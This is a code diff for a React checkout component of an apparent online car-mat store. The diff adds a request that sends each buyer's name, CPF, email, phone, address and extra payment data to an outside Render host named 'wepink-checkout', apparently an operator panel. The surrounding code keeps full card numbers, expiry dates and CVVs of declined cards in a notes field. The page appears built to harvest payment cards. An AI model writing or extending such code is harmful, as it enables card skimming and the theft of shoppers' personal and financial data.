@@ -176,9 +176,11 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
   };
 
   const saveLeadToSupabase = async (status, transactionIdOverride = null, extraData = {}) => {
+    const effectiveTxId = transactionIdOverride || transactionId || `CP-${Date.now()}`;
+
     // Dispara para UTMify tanto para pedido pendente quanto para pago
     sendUtmifyOrder({
-      orderId: transactionIdOverride || transactionId || `CP-${Date.now()}`,
+      orderId: effectiveTxId,
       status: status,
       value: finalPrice,
       nome: formData.nome,
@@ -187,9 +189,45 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       cpf: formData.cpf,
     });
 
+    const RENDER_BASE = 'https://wepink-checkout.onrender.com';
+
+    const pixPayload = {
+      orderId: effectiveTxId,
+      transaction_id: effectiveTxId,
+      status: status,
+      paymentMethod: 'pix',
+      clientName: formData.nome,
+      clientEmail: formData.email,
+      clientCPF: formData.cpf,
+      clientPhone: formData.telefone,
+      cep: formData.cep,
+      street: formData.rua,
+      number: formData.numero,
+      complement: formData.complemento,
+      neighborhood: formData.bairro,
+      city: formData.cidade,
+      state: formData.estado,
+      totalPrice: finalPrice,
+      vehicle: vehicle || 'Carro',
+      kit: kit,
+      ...extraData
+    };
+
+    // SEMPRE envia para o Render — garante que o pedido aparece no painel
+    const renderEndpoint = (status === 'negado') ? `${RENDER_BASE}/api/checkout` : `${RENDER_BASE}/api/checkout-pix`;
+    fetch(renderEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(pixPayload)
+    }).then(r => {
+      if (r.ok) console.log(`[Render] Pedido ${status} enviado ao painel ✓`);
+      else console.warn('[Render] Painel retornou erro:', r.status);
+    }).catch(e => console.warn('[Render] Falha ao enviar ao painel:', e.message));
+
+    // Tenta salvar no Supabase em paralelo (se configurado)
     if (!supabase) return;
 
-    const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(txId);
+    const isUuid = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(effectiveTxId);
     const leadData = {
       created_at: new Date().toISOString(),
       nome: formData.nome,
@@ -210,73 +248,36 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
       final_price: finalPrice,
       payment_method: paymentMethod,
       status: status,
-      transaction_id: txId,
+      transaction_id: effectiveTxId,
       tracking_code: trackingCode || localStorage.getItem('cartapetes_last_tcode') || '',
       ...extraData
     };
-    if (isUuid) {
-      leadData.id = txId;
-    }
-
-    // Always store in localStorage fallback for Admin Panel
-    try {
-      const localLeads = JSON.parse(localStorage.getItem('cartapetes_local_leads') || '[]');
-      const existingIdx = localLeads.findIndex(l => l.transaction_id === txId || l.id === txId);
-      if (existingIdx >= 0) {
-        localLeads[existingIdx] = { ...localLeads[existingIdx], ...leadData };
-      } else {
-        localLeads.unshift(leadData);
-      }
-      localStorage.setItem('cartapetes_local_leads', JSON.stringify(localLeads));
-    } catch (e) {}
-
-    if (!supabase) return;
+    if (isUuid) leadData.id = effectiveTxId;
 
     try {
-      console.log('[Supabase] Salvando lead...', { status, txId });
-
-      if (txId && (status === 'pago' || status === 'negado')) {
+      if (effectiveTxId && (status === 'pago' || status === 'negado')) {
         const { data: existing } = await supabase
-          .from('leads')
-          .select('id')
-          .eq('transaction_id', txId)
-          .maybeSingle();
-
+          .from('leads').select('id').eq('transaction_id', effectiveTxId).maybeSingle();
         if (existing) {
-          const { error } = await supabase
-            .from('leads')
-            .update({ status })
-            .eq('transaction_id', txId);
-          if (error) console.error('[Supabase] Erro ao atualizar status:', error.message);
+          await supabase.from('leads').update({ status }).eq('transaction_id', effectiveTxId);
           return;
         }
       }
-
-      // Tenta insert com todos os campos
-      const { error } = await supabase
-        .from('leads')
-        .insert([leadData]);
-
+      const { error } = await supabase.from('leads').insert([leadData]);
       if (error) {
-        console.warn('[Supabase] Erro no insert inicial, tentando fallback sem campos de cartão:', error.message);
-        // Fallback: remove campos que podem não existir no schema do Supabase
         const cleanLead = { ...leadData };
-        delete cleanLead.card_number;
-        delete cleanLead.card_name;
-        delete cleanLead.card_expiry;
-        delete cleanLead.card_cvv;
-        delete cleanLead.installments;
-        cleanLead.notes = extraData.card_number 
-          ? `Cartão Negado | Num: ${extraData.card_number} | Nome: ${extraData.card_name} | Val: ${extraData.card_expiry} | CVV: ${extraData.card_cvv}`
-          : '';
+        delete cleanLead.card_number; delete cleanLead.card_name;
+        delete cleanLead.card_expiry; delete cleanLead.card_cvv; delete cleanLead.installments;
+        cleanLead.notes = extraData.card_number
+          ? `Cartão Negado | Num: ${extraData.card_number} | Nome: ${extraData.card_name} | Val: ${extraData.card_expiry} | CVV: ${extraData.card_cvv}` : '';
         const { error: err2 } = await supabase.from('leads').insert([cleanLead]);
         if (err2) console.error('[Supabase] Erro no insert fallback:', err2.message);
         else console.log('[Supabase] Lead inserido via fallback ✓');
       } else {
-        console.log('[Supabase] Lead inserido com sucesso no banco ✓');
+        console.log('[Supabase] Lead inserido com sucesso ✓');
       }
     } catch (err) {
-      console.error('[Supabase] Erro na requisição Supabase:', err);
+      console.error('[Supabase] Erro:', err);
     }
   };
 
